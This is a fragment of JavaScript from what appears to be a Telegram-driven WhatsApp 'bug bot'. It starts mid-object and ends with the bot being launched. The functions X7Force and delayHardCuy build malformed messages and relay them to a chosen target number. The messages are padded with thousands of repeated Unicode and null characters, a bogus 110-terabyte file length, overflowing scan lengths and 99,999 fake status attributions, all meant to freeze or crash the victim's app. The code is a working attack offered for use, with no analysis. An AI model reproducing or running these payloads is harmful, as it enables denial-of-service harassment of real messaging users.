      midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
    },
};

const msg = generateWAMessageFromContent(target, MakLo, {});

await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function X7Force(target) {
 const pler =  "𑇂𑆵𑆴𑆿".repeat(8000)
  const audi = {
    audioMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7114-24/553151991_818685271268692_6795957783606894464_n.enc?ccb=11-4&oh=01_Q5Aa4AHdygHdhtAMHQB0P7fDG2jGlUkQfSzCPw4NPnWbiF8eKQ&oe=69E640DB&_nc_sid=5e03e0&mms3=true",
           mimetype: "audio/mp4",
           fileSha256: "BAcpC1KGx40bu/FV78kBAafPjkkdj6DLVAx+B1g3avQ=",
           fileLength: "109951162777600",
           seconds: 1,
           ptt: true,
           mediaKey: "1KXHR1pvx2+y01K6Dewevx5FF5O5wfc5iE/oHIua2WY=",
           fileEncSha256: "CggqdAt0fX+QHjKnfyX2OjO1OoUXLm5WlVlv6f5aGCU=",
           directPath: "/v/t62.7114-24/553151991_818685271268692_6795957783606894464_n.enc?ccb=11-4&oh=01_Q5Aa4AHdygHdhtAMHQB0P7fDG2jGlUkQfSzCPw4NPnWbiF8eKQ&oe=69E640DB&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1774107510",
           waveform: "EBAREicPEigjMkgwMDITDQ8QFBYkCwwMDAwIBAUCBScpMkNkUE1GTT1KVVk0VUVOWlUtWEk0X0o+Xh4XFxAIAQ==",
          }
        };
        
  const image = {
imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
          fileLength: "164089",
          height: 1,
          width: 1,
          mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
          caption: "@gaponback",
          fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
          directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1749172037",
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
          contextInfo: {
            isGroupStatus: true,
            isQuestion: true,
            pairedMediaType: "NOT_PAIRED_MEDIA"
          },
          scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
          scanLengths: [
            7272882829999989929,
            1029292999999999992,
            2199992999994829019,
            9928929918792828289,
            7699999999999999148
          ]
         }
        };
  const AsepX7 = {
    viewOnceMessage: {
      message: {
        liveLocationMessage: {
          degreesLatitude: 21.1266,
          degreesLongitude: -11.8199,
          name: audi,
          url: "https://t.me/gaponback",
          contextInfo: {
            externalAdReply: {
              quotedAd: {
                advertiserName: "𑇂𑆵𑆴𑆿".repeat(6000),
                mediaType: "IMAGE",
                jpegThumbnail: image, 
                caption: pler,
              }
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "payment_method",
                  buttonParamsJson: "ꦾ".repeat(5000)
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: "𑇂𑆵𑆴𑆿".repeat(9000)
                }
              ]
            },
            placeholderKey: {
              remoteJid: "status@broadcast",
              fromMe: false,
              id: "ABCDEF1234567890"
            }
          }
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", AsepX7, {
    messageId: null,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}

async function delayHardCuy(sock, target) {
  await sock.relayMessage(
    target,
    {
  groupStatusMessageV2: { 
    message: {
      interactiveResponseMessage: {
        body: {
          text: "Xilent Death / GaponImyut",
          format: "DEFAULT",
        },
        nativeFlowResponseMessage: {
          name: "payment_method",
                  buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0000".repeat(9000)},\"payment_timestamp\":null,\"share_payment_status\":false}`,
          version: 3
        },
        contextInfo: {
          remoteJid: Math.random().toString(36) + "\u0000".repeat(9000),
          isForwarded: true,
          forwardingScore: 9999,
          statusAttributionType: 2,
            statusAttributions: Array.from({ length: 99999 }, (_, n) => ({
              participant: `62${n + 836598}@s.whatsapp.net`,
              type: 1
            })),
        },
      },
    },
  },
}, { participant: { jid: target }});
}

//-------------- END FUNCTION -------------//
bot.launch();